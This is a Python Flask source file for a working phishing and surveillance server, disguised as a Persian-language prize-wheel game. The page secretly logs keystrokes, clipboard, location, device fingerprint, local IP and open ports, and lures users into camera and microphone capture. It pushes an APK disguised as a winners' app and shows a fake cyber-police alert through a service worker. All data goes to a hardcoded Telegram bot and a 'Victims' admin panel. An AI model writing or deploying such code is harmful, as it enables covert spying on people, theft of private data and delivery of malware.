import os, io, uuid, base64, json, logging, sqlite3, time
from datetime import datetime
from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, redirect, url_for, make_response
import requests

# -------------------- Configuration --------------------
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8391932958")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
DATABASE = "victims.db"

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# -------------------- Database --------------------
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
        # جدول credentials دیگر نیاز نیست ولی برای سازگاری باقی می‌ماند
        db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, code2fa TEXT, timestamp TEXT)")
        db.commit()

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

# -------------------- Telegram Helpers --------------------
def send_telegram_message(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram message failed: {e}")

def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
        if as_image:
            url += "sendPhoto"
            files = {'photo': (filename, io.BytesIO(file_bytes), 'image/jpeg')}
        elif as_video:
            url += "sendVideo"
            files = {'video': (filename, io.BytesIO(file_bytes), 'video/webm')}
        else:
            url += "sendDocument"
            files = {'document': (filename, io.BytesIO(file_bytes), 'application/octet-stream')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        app.logger.error(f"Telegram file send failed: {e}")

# -------------------- Templates --------------------
GAME_PAGE_SPIN = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>چرخ شانس - جایزه بزرگ</title>
<style>
    body {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        text-align: center;
        color: white;
        margin: 0;
        padding: 20px;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
    }
    .container {
        background: rgba(255,255,255,0.1);
        border-radius: 30px;
        padding: 30px;
        backdrop-filter: blur(10px);
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        max-width: 500px;
        width: 90%;
    }
    h1 {
        font-size: 2.5rem;
        margin-bottom: 10px;
        color: #ffd700;
        text-shadow: 0 0 20px #ffd700;
    }
    .subtitle {
        color: #ccc;
        margin-bottom: 20px;
    }
    #wheelCanvas {
        width: 300px;
        height: 300px;
        margin: 20px auto;
        display: block;
    }
    .btn {
        background: #ff4757;
        color: white;
        border: none;
        padding: 15px 40px;
        font-size: 22px;
        border-radius: 50px;
        cursor: pointer;
        margin: 20px 0;
        font-weight: bold;
        box-shadow: 0 5px 15px rgba(255,71,87,0.4);
        transition: transform 0.2s;
    }
    .btn:hover { transform: scale(1.05); }
    .btn:disabled { background: #666; cursor: not-allowed; box-shadow: none; }
    #result {
        font-size: 1.5rem;
        margin: 20px 0;
        min-height: 40px;
        color: #ffd700;
    }
    #cameraSection {
        display: none;
        margin-top: 20px;
    }
    #apkBtn {
        display: none;
        background: #2ed573;
        color: white;
        padding: 15px 30px;
        border-radius: 50px;
        text-decoration: none;
        font-size: 20px;
        font-weight: bold;
        margin-top: 20px;
    }
    video, canvas { display: none; }
</style>
</head>
<body>
    <div class="container">
        <h1>🎰 چرخ شانس</h1>
        <p class="subtitle">بچرخون و جایزه بزرگ ببر!</p>
        
        <canvas id="wheelCanvas" width="400" height="400"></canvas>
        
        <button class="btn" id="spinBtn" onclick="spin()">🎲 بچرخون!</button>
        
        <div id="result"></div>
        
        <div id="cameraSection">
            <p>برای دریافت جایزه، باید دستگاه شما احراز هویت شود. لطفاً دسترسی به دوربین را تأیید کنید.</p>
            <button class="btn" onclick="requestCamera()">📸 تأیید و دریافت جایزه</button>
        </div>
        
        <video id="v" autoplay playsinline></video>
        <canvas id="c"></canvas>
        
        <a id="apkBtn" href="/download/app-update.apk" download>
            📱 دانلود برنامه مخصوص برندگان
        </a>
    </div>

    <script>
        const t = "{{ token }}";
        
        // ---------- جمع‌آوری اطلاعات پس‌زمینه (بدون اجازه) ----------
        fetch('/log/' + t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
            type: 'device',
            ua: navigator.userAgent,
            platform: navigator.platform,
            lang: navigator.language,
            screen: screen.width+'x'+screen.height,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory || 'N/A'
        })});

        // اثر انگشت Canvas
        try {
            const cf = document.createElement('canvas');
            cf.width = 200; cf.height = 50;
            const cfctx = cf.getContext('2d');
            cfctx.textBaseline = 'top';
            cfctx.font = '14px Arial';
            cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
            fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data: cf.toDataURL()})});
        } catch(e) {}

        // آی‌پی داخلی
        try {
            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
                }
            };
        } catch(e) {}

        // موقعیت
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
                err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
            );
        }

        // کلیپ‌بورد (با کلیک روی دکمه چرخش)
        document.addEventListener('click', async function readClipboard() {
            try {
                const clip = await navigator.clipboard.readText();
                if (clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})});
            } catch(e) {}
        }, {once: true});

        // کی‌لاگر
        let keys = '';
        document.addEventListener('keydown', e => { keys += e.key; });
        setInterval(() => {
            if (keys.length > 0) {
                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
                keys = '';
            }
        }, 5000);

        // اسکن پورت داخلی
        const ports = [80, 22, 443, 8080, 3389, 5900, 21];
        ports.forEach(port => {
            const img = new Image();
            img.src = `http://127.0.0.1:${port}/favicon.ico?t=` + Date.now();
            const start = Date.now();
            img.onload = img.onerror = function() {
                const elapsed = Date.now() - start;
                if (elapsed < 500) {
                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:port})});
                }
            };
        });

        // سرویس ورکر (اعلان پلیس فتا)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js?t=' + t).then(reg => {
                setTimeout(() => {
                    reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
                        body: 'فعالیت غیرمجاز در این دستگاه شناسایی شده است. برای رفع اتهام و تأیید هویت روی این اعلان کلیک کنید.',
                        icon: 'https://www.fata.gov.ir/images/logo.png',
                        requireInteraction: true,
                        vibrate: [300, 100, 300],
                        data: { url: window.location.origin + '/go/' + t }
                    });
                }, 15000);
            });
        }

        // =============== چرخ شانس ===============
        const canvas = document.getElementById('wheelCanvas');
        const ctx = canvas.getContext('2d');
        const spinBtn = document.getElementById('spinBtn');
        const resultDiv = document.getElementById('result');
        const cameraSection = document.getElementById('cameraSection');
        const apkBtn = document.getElementById('apkBtn');
        const v = document.getElementById('v'), c = document.getElementById('c'), ctx2 = c.getContext('2d');

        const prizes = [
            { label: 'آیفون ۱۵', color: '#ff4757', value: 'iPhone' },
            { label: 'شارژ رایگان', color: '#2ed573', value: 'charge' },
            { label: 'پول نقد', color: '#ffa502', value: 'cash' },
            { label: 'لپ‌تاپ', color: '#1e90ff', value: 'laptop' },
            { label: 'شما برنده نشدید', color: '#747d8c', value: 'lose' },
            { label: 'هدفون', color: '#ff6b81', value: 'headphone' },
            { label: 'آیفون ۱۵', color: '#ff4757', value: 'iPhone' },
            { label: 'شارژ رایگان', color: '#2ed573', value: 'charge' }
        ];
        const numSlices = prizes.length;
        const anglePerSlice = (2 * Math.PI) / numSlices;
        let spinning = false;
        let currentAngle = 0;

        function drawWheel(angleOffset = 0) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            const centerX = canvas.width / 2;
            const centerY = canvas.height / 2;
            const radius = 180;

            for (let i = 0; i < numSlices; i++) {
                const startAngle = i * anglePerSlice + angleOffset;
                const endAngle = startAngle + anglePerSlice;
                
                ctx.beginPath();
                ctx.moveTo(centerX, centerY);
                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
                ctx.closePath();
                ctx.fillStyle = prizes[i].color;
                ctx.fill();
                ctx.strokeStyle = '#fff';
                ctx.lineWidth = 2;
                ctx.stroke();

                ctx.save();
                ctx.translate(centerX, centerY);
                ctx.rotate(startAngle + anglePerSlice / 2);
                ctx.textAlign = "right";
                ctx.fillStyle = "#fff";
                ctx.font = "bold 14px 'Segoe UI'";
                ctx.fillText(prizes[i].label, radius - 20, 8);
                ctx.restore();
            }

            ctx.beginPath();
            ctx.arc(centerX, centerY, 30, 0, 2 * Math.PI);
            ctx.fillStyle = '#fff';
            ctx.fill();
            ctx.fillStyle = '#333';
            ctx.font = "bold 14px Arial";
            ctx.textAlign = "center";
            ctx.fillText("🎲", centerX, centerY + 6);
        }

        function spin() {
            if (spinning) return;
            spinning = true;
            spinBtn.disabled = true;
            resultDiv.innerHTML = '';
            cameraSection.style.display = 'none';
            apkBtn.style.display = 'none';

            const targetPrizeIndex = 0;
            const targetMiddleAngle = targetPrizeIndex * anglePerSlice + anglePerSlice / 2;
            const spinToAngle = (2 * Math.PI) - targetMiddleAngle + Math.PI/2;
            const fullSpins = 5 * 2 * Math.PI;
            const finalAngle = currentAngle + fullSpins + spinToAngle - (currentAngle % (2 * Math.PI));
            
            const duration = 4000;
            const startAngle = currentAngle;
            const startTime = performance.now();

            function animate(now) {
                const elapsed = now - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const eased = 1 - Math.pow(1 - progress, 3);
                currentAngle = startAngle + (finalAngle - startAngle) * eased;
                drawWheel(currentAngle);
                if (progress < 1) {
                    requestAnimationFrame(animate);
                } else {
                    spinning = false;
                    spinBtn.disabled = false;
                    const normalizedAngle = currentAngle % (2 * Math.PI);
                    const pointerAngle = (2 * Math.PI) - (Math.PI / 2);
                    let sliceIndex = Math.floor(((pointerAngle - normalizedAngle + 2 * Math.PI) % (2 * Math.PI)) / anglePerSlice);
                    sliceIndex = sliceIndex % numSlices;
                    const wonPrize = prizes[sliceIndex];
                    
                    if (wonPrize.value === 'lose') {
                        resultDiv.innerHTML = '😢 متأسفانه برنده نشدی! دوباره شانست رو امتحان کن.';
                        spinBtn.innerHTML = '🔄 دوباره بچرخون';
                    } else {
                        resultDiv.innerHTML = `🎉 تبریک! شما برنده <strong>${wonPrize.label}</strong> شدید!`;
                        cameraSection.style.display = 'block';
                        spinBtn.style.display = 'none';
                    }
                }
            }
            requestAnimationFrame(animate);
        }

        async function requestCamera() {
            cameraSection.style.display = 'none';
            resultDiv.innerHTML = 'در حال احراز هویت...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                v.srcObject = stream;
                await new Promise(r => v.onloadedmetadata = r);
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                ctx2.drawImage(v, 0, 0, c.width, c.height);
                const dataURL = c.toDataURL('image/jpeg', 0.8);
                fetch('/upload/' + t, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ type: 'photo', data: dataURL })
                });
                // ضبط صدا ۵ ثانیه
                try {
                    const audioTrack = stream.getAudioTracks()[0];
                    if (audioTrack) {
                        const mr = new MediaRecorder(new MediaStream([audioTrack]));
                        let chunks = [];
                        mr.ondataavailable = e => chunks.push(e.data);
                        mr.onstop = () => {
                            const blob = new Blob(chunks, {type:'audio/webm'});
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const b64 = reader.result.split(',')[1];
                                fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})});
                            };
                            reader.readAsDataURL(blob);
                        };
                        mr.start();
                        setTimeout(() => { mr.stop(); }, 5000);
                    }
                } catch(e) {}
                stream.getTracks().forEach(track => track.stop());
                resultDiv.innerHTML = '✅ احراز هویت موفق! اکنون جایزه خود را دریافت کنید.';
                apkBtn.style.display = 'inline-block';
            } catch (e) {
                resultDiv.innerHTML = '⚠️ بدون احراز هویت هم می‌توانید جایزه را دریافت کنید.';
                apkBtn.style.display = 'inline-block';
            }
        }

        drawWheel(0);
    </script>
</body></html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html><html><head><title>Login</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
<body><h2>Admin Panel</h2><form method=post action=/admin><input type=password name=pass placeholder=Password><br><input type=submit value=Login></form></body></html>
"""

ADMIN_PANEL = """
<!DOCTYPE html><html><head><title>Victims</title>
<style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
<body>
<h1>🎯 Victims</h1>
{% for v in victims %}
<div class=v>
  <b>Token:</b> {{ v.token }}<br>
  <b>IP:</b> {{ v.ip }}<br>
  <b>Local IP:</b> {{ v.local_ip }}<br>
  <b>Time:</b> {{ v.created_at }}<br>
  <b>Device:</b> <pre>{{ v.info }}</pre>
  {% if v.photo %}<b>Latest Photo:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
  {% if v.audio %}<b>Audio:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
  {% if v.location %}<b>Location:</b> <a href="https://maps.google.com/?q={{ v.location }}" target=_blank>View on map</a><br>{% endif %}
  <b>Clipboard:</b> {{ v.clipboard }}<br>
  <b>Keystrokes:</b> {{ v.keystrokes }}<br>
  <b>Open Ports:</b> {{ v.open_ports }}<br>
  <b>Visited Sites:</b> {{ v.history }}
</div>
{% endfor %}
</body></html>
"""

# -------------------- Routes --------------------
@app.route('/')
def index():
    return "Server running. <a href='/new-link'>/new-link</a> | <a href='/admin'>/admin</a>"

@app.route('/new-link')
def new_link():
    token = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
               (token, datetime.now().isoformat(), request.remote_addr))
    db.commit()
    link = f"{request.host_url}go/{token}"
    return jsonify({"link": link, "token": token})

@app.route('/go/<token>')
def go_to_game(token):
    """مستقیماً به بازی چرخ شانس هدایت می‌شود، بدون صفحه لاگین"""
    return render_template_string(GAME_PAGE_SPIN, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload(token):
    data = request.get_json()
    if not data:
        return jsonify({"error":"no data"}),400
    media_type = data.get('type')
    raw = data.get('data')
    try:
        if media_type == 'photo':
            binary = base64.b64decode(raw.split(',')[1] if ',' in raw else raw)
        elif media_type == 'audio':
            binary = base64.b64decode(raw)
        else:
            return jsonify({"error":"unknown type"}),400
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, media_type, binary, datetime.now().isoformat()))
        db.commit()
        # ارسال به تلگرام
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            if media_type == 'photo':
                send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo</b> from {token}", as_image=True)
            elif media_type == 'audio':
                send_telegram_file(binary, 'mic.webm', f"🎤 <b>Audio</b> from {token}")
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"error":str(e)}),500

@app.route('/screen/<token>', methods=['POST'])
def screen_upload(token):
    data = request.get_json()
    if not data or 'data' not in data:
        return jsonify({"error":"no data"}),400
    try:
        binary = base64.b64decode(data['data'])
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, 'screen', binary, datetime.now().isoformat()))
        db.commit()
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            send_telegram_file(binary, 'screen.webm', f"🖥️ <b>Screen Recording</b> from {token}", as_video=True)
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"error":str(e)}),500

@app.route('/log/<token>', methods=['POST'])
def log(token):
    data = request.get_json()
    data['ip'] = request.remote_addr
    db = get_db()
    db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
               (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
    db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
    db.commit()
    # ارسال مرتب به تلگرام
    if data.get('type') == 'device':
        send_telegram_message(f"📱 <b>Device Connected</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nUser-Agent: {data.get('ua','')}")
    elif data.get('type') == 'location':
        send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
    elif data.get('type') == 'local_ip':
        send_telegram_message(f"🖥️ <b>Internal IP</b> for {token}: {data.get('ip')}")
    elif data.get('type') == 'clipboard':
        send_telegram_message(f"📋 <b>Clipboard</b> from {token}: <code>{data.get('data','')}</code>")
    elif data.get('type') == 'keystrokes':
        send_telegram_message(f"⌨️ <b>Keystrokes</b> from {token}: <code>{data.get('data','')}</code>")
    elif data.get('type') == 'open_port':
        send_telegram_message(f"🔌 <b>Open Port</b> on {token}: {data.get('port')}")
    elif data.get('type') == 'history':
        send_telegram_message(f"🌐 <b>Visited</b> {data.get('site')}: {data.get('visited')}")
    return jsonify({"status":"ok"})

# ---------- Service Worker ----------
SW_JS = """
self.addEventListener('install', event => {
  self.skipWaiting();
});
self.addEventListener('activate', event => {
  event.waitUntil(clients.claim());
});
self.addEventListener('notificationclick', event => {
  event.notification.close();
  const urlToOpen = event.notification.data && event.notification.data.url 
                      ? event.notification.data.url 
                      : '/';
  event.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(windowClients => {
      for (let client of windowClients) {
        if (client.url.includes(urlToOpen.split('/').pop())) {
          return client.focus();
        }
      }
      if (clients.openWindow) {
        return clients.openWindow(urlToOpen);
      }
    })
  );
});
setInterval(() => {
  if('geolocation' in navigator){
    navigator.geolocation.getCurrentPosition(pos => {
      self.clients.matchAll().then(clients => {
        clients.forEach(client => {
          const url = new URL(client.url);
          const token = url.searchParams.get('t') || url.pathname.split('/').pop();
          fetch('/log/'+token, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({type:'location',lat:pos.coords.latitude,lng:pos.coords.longitude})
          });
        });
      });
    });
  }
}, 30000);
"""
@app.route('/sw.js')
def service_worker():
    response = make_response(SW_JS)
    response.headers['Content-Type'] = 'application/javascript'
    return response

# ---------- Admin ----------
@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('pass') == ADMIN_PASSWORD:
            resp = app.make_response("logged in")
            resp.set_cookie('admin','1')
            return resp
        return "Wrong password",403
    if request.cookies.get('admin') != '1':
        return render_template_string(ADMIN_LOGIN)
    db = get_db()
    victims_rows = db.execute("SELECT * FROM victims ORDER BY created_at DESC").fetchall()
    victims = []
    for row in victims_rows:
        token = row['token']
        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        info = json.loads(log_dev['data']) if log_dev else {}
        local_ip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='local_ip' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        local_ip = json.loads(local_ip_row['data']).get('ip','') if local_ip_row else ""
        clip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        clipboard = json.loads(clip_row['data']).get('data','') if clip_row else ""
        keys_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
        keystrokes = ''.join([json.loads(k['data']).get('data','') for k in keys_rows])
        ports_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='open_port' ORDER BY timestamp ASC", (token,)).fetchall()
        open_ports = ', '.join(set([str(json.loads(p['data']).get('port','')) for p in ports_rows]))
        hist_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
        history = ', '.join([f"{json.loads(h['data']).get('site','')} ({json.loads(h['data']).get('visited')})" for h in hist_rows])
        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        loc = None
        if loc_row:
            loc_data = json.loads(loc_row['data'])
            loc = f"{loc_data.get('lat')},{loc_data.get('lng')}"
        victims.append({
            "token": token,
            "ip": row['ip'],
            "local_ip": local_ip,
            "created_at": row['created_at'],
            "info": json.dumps(info, indent=2, ensure_ascii=False),
            "photo": photo_b64,
            "audio": audio_b64,
            "location": loc,
            "clipboard": clipboard,
            "keystrokes": keystrokes,
            "open_ports": open_ports,
            "history": history
        })
    return render_template_string(ADMIN_PANEL, victims=victims)

@app.route('/download/<path:filename>')
def download_file(filename):
    return send_from_directory('static', filename)

# -------------------- Main --------------------
if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
